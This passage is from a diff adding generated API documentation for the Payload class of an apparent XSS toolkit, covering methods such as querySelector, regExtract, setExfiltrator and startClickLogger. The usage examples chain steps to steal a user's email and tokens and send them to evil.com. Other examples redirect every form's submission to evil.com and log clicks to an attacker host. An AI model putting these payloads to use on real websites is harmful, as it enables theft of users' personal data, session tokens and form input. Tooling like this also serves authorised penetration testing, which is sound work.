+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/user/me")
+              .querySelector('input[name=email]', 'value')
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-querySelector">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-querySelector" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>selector_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>CSS selector,</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>attr</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>Attribute</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take the pipe value and search for the first element matching the selector, the element is then set as the pipe value.\n     * If attr is passed to the function, only the corresponding attribute is passed in the pipe\n     *\n     * @param {string} selector_or_func CSS selector,\n     * @param {string} [attr=null] Attribute\n     * @graph $Payload -> {Document} ($current) {HTMLElement | Any} -> $Payload\n     * @example\n     * const p = Payload.new()                                       # by default the pipe value is set to window.document\n     *               .querySelector('title')                       # get the title element\n     *               .passthru(el => el.innerText = 'New title')   # change the title\n     *\n     * eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .fetchDOM(\"/user/me\")\n     *               .querySelector('input[name=email]', 'value')\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[17458,18126],"filename":"Payload.js","lineno":471,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002038","name":"Payload#querySelector","type":"MethodDefinition","paramnames":["selector_or_func","attr"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take the pipe value and search for the first element matching the selector, the element is then set as the pipe value.\nIf attr is passed to the function, only the corresponding attribute is passed in the pipe</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Document\",\"label\":\"querySelector(selector_or_func, attr=null)\",\"children\":null,\"returnType\":\"HTMLElement | Any\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"description":"<p>CSS selector,</p>","name":"selector_or_func"},{"type":{"names":["string"]},"optional":true,"defaultvalue":null,"description":"<p>Attribute</p>","name":"attr"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Document","label":"querySelector(selector_or_func, attr=null)","children":null,"returnType":"HTMLElement | Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()                                       # by default the pipe value is set to window.document\n              .querySelector('title')                       # get the title element\n              .passthru(el => el.innerText = 'New title')   # change the title\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/user/me\")\n              .querySelector('input[name=email]', 'value')\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"querySelector","longname":"Payload#querySelector","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000162","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"querySelector","signature":"<span class=\"signature\">(selector_or_func, attr<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line515">515</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="querySelectorAll">
+      <a href="#params-querySelectorAll"><span class="type-signature"></span>querySelectorAll</a><span class="signature">(selector_or_func, attr<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take the pipe value and search for all elements matching the selector, an array of elements is then set as the pipe value.
+If attr is passed to the function, only the corresponding attribute is passed in the pipe</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Document","label":"querySelectorAll(selector_or_func, attr=null)","children":null,"returnType":"[HTMLElement] | [Any]"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()                                       # by default the pipe value is set to window.document
+              .querySelectorAll('form')                     # get all the forms
+              .passthru(els => {
+                  els.forEach(el => el.action = '//evil.com') # change the form destination
+                })
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/")
+              .querySelectorAll('a', 'href')     # Get all the link present on the page
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-querySelectorAll">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-querySelectorAll" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>selector_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>CSS selector,</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>attr</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>Attribute</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take the pipe value and search for all elements matching the selector, an array of elements is then set as the pipe value.\n     * If attr is passed to the function, only the corresponding attribute is passed in the pipe\n     *\n     * @param {string} selector_or_func CSS selector,\n     * @param {string} [attr=null] Attribute\n     * @graph $Payload -> {Document} ($current) {[HTMLElement] | [Any]} -> $Payload\n     * @example\n     * const p = Payload.new()                                       # by default the pipe value is set to window.document\n     *               .querySelectorAll('form')                     # get all the forms\n     *               .passthru(els => {\n     *                   els.forEach(el => el.action = '//evil.com') # change the form destination\n     *                 })\n     *\n     * eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .fetchDOM(\"/\")\n     *               .querySelectorAll('a', 'href')     # Get all the link present on the page\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[19288,20033],"filename":"Payload.js","lineno":515,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002140","name":"Payload#querySelectorAll","type":"MethodDefinition","paramnames":["selector_or_func","attr"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take the pipe value and search for all elements matching the selector, an array of elements is then set as the pipe value.\nIf attr is passed to the function, only the corresponding attribute is passed in the pipe</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Document\",\"label\":\"querySelectorAll(selector_or_func, attr=null)\",\"children\":null,\"returnType\":\"[HTMLElement] | [Any]\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"description":"<p>CSS selector,</p>","name":"selector_or_func"},{"type":{"names":["string"]},"optional":true,"defaultvalue":null,"description":"<p>Attribute</p>","name":"attr"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Document","label":"querySelectorAll(selector_or_func, attr=null)","children":null,"returnType":"[HTMLElement] | [Any]"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()                                       # by default the pipe value is set to window.document\n              .querySelectorAll('form')                     # get all the forms\n              .passthru(els => {\n                  els.forEach(el => el.action = '//evil.com') # change the form destination\n                })\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/\")\n              .querySelectorAll('a', 'href')     # Get all the link present on the page\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"querySelectorAll","longname":"Payload#querySelectorAll","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000166","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"querySelectorAll","signature":"<span class=\"signature\">(selector_or_func, attr<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line861">861</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="redirect">
+      <a href="#params-redirect"><span class="type-signature"></span>redirect</a><span class="signature">(url)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Redirect the user to a new url</p>
+</div>
+
+
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-redirect">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-redirect" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>url</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">*</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Redirect the user to a new url\n     * @param {*} url\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[32048,32135],"filename":"Payload.js","lineno":861,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100003291","name":"Payload#redirect","type":"MethodDefinition","paramnames":["url"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Redirect the user to a new url</p>","params":[{"type":{"names":["*"]},"name":"url"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"redirect","longname":"Payload#redirect","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000240","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"redirect","signature":"<span class=\"signature\">(url)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line551">551</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="regExtract">
+      <a href="#params-regExtract"><span class="type-signature"></span>regExtract</a><span class="signature">(reg_or_func, flags<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take the pipe value as a string an perform a regex search on it, the first matched group is return in the pipe</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"regExtract(reg_or_func, flags=\"\")","children":null,"returnType":"String | null"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchText("/")
+              .regExtract('token=([a-f0-9]+)')
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-regExtract">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-regExtract" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>reg_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>Regex</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>flags</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    ""
+                
+                </td>
+            
+
+            <td class="description last"><p>Flags for the regex [gimsuy]</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take the pipe value as a string an perform a regex search on it, the first matched group is return in the pipe\n     *\n     * @param {string} reg_or_func Regex\n     * @param {string} [flags=\"\"] Flags for the regex [gimsuy]\n     \n     * @graph $Payload -> {String} ($current) {String | null} -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .fetchText(\"/\")\n     *               .regExtract('token=([a-f0-9]+)')\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[20628,21186],"filename":"Payload.js","lineno":551,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002266","name":"Payload#regExtract","type":"MethodDefinition","paramnames":["reg_or_func","flags"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take the pipe value as a string an perform a regex search on it, the first matched group is return in the pipe</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String\",\"label\":\"regExtract(reg_or_func, flags=\\\"\\\")\",\"children\":null,\"returnType\":\"String | null\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"description":"<p>Regex</p>","name":"reg_or_func"},{"type":{"names":["string"]},"optional":true,"defaultvalue":"\"\"","description":"<p>Flags for the regex [gimsuy]</p>","name":"flags"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String","label":"regExtract(reg_or_func, flags=\"\")","children":null,"returnType":"String | null"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchText(\"/\")\n              .regExtract('token=([a-f0-9]+)')\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"regExtract","longname":"Payload#regExtract","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000170","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"regExtract","signature":"<span class=\"signature\">(reg_or_func, flags<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line236">236</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="setExfiltrator">
+      <a href="#params-setExfiltrator"><span class="type-signature"></span>setExfiltrator</a><span class="signature">(exfiltrator)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Set the exfiltrator to use when <code>exfiltrate</code> is called.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"setExfiltrator(exfiltrator)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p new Payload()
+            .setExfiltrator(x => fetch('https://evil.com/?' + x))
+            .eval(x=>42)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p new Payload()
+            .setExfiltrator(exfiltrators.message())
+            .eval(x=>42)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-setExfiltrator">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-setExfiltrator" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>exfiltrator</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>exfiltrator to use.
+exfiltrator is a function that take the data to exfiltrate and do something with it.</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Set the exfiltrator to use when <code>exfiltrate</code> is called.\n    * @graph $Payload -> ($current) -> $Payload\n    * @param {Payload|function} exfiltrator exfiltrator to use.\n    * exfiltrator is a function that take the data to exfiltrate and do something with it.\n    * @example\n    * const p new Payload()\n    *             .setExfiltrator(x => fetch('https://evil.com/?' + x))\n    *             .eval(x=>42)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n    * @example\n    * const p new Payload()\n    *             .setExfiltrator(exfiltrators.message())\n    *             .eval(x=>42)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[8237,8347],"filename":"Payload.js","lineno":236,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001683","name":"Payload#setExfiltrator","type":"MethodDefinition","paramnames":["exfiltrator"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Set the exfiltrator to use when <code>exfiltrate</code> is called.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"setExfiltrator(exfiltrator)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"setExfiltrator(exfiltrator)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["Payload","function"]},"description":"<p>exfiltrator to use.\nexfiltrator is a function that take the data to exfiltrate and do something with it.</p>","name":"exfiltrator"}],"examples":[{"caption":"","code":"const p new Payload()\n            .setExfiltrator(x => fetch('https://evil.com/?' + x))\n            .eval(x=>42)\n            .exfiltrate()\n\neval(p.run())"},{"caption":"","code":"const p new Payload()\n            .setExfiltrator(exfiltrators.message())\n            .eval(x=>42)\n            .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"setExfiltrator","longname":"Payload#setExfiltrator","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000149","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"setExfiltrator","signature":"<span class=\"signature\">(exfiltrator)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line642">642</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="startClickLogger">
+      <a href="#params-startClickLogger"><span class="type-signature"></span>startClickLogger</a><span class="signature">(f<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Start a click logger, each click position and targeted element will be exfiltrated via the exfiltrators.<br>
+<br>
+The pipe value is not modified.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"startClickLogger(f=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .setExfiltrator(exfiltrator.get('//evil.com'))
+              .startClickLogger()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .setExfiltrator(ev => console.log(ev.target))
+              .startClickLogger()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-startClickLogger">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-startClickLogger" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>f</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>User defined function to call instead of exfiltrating</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
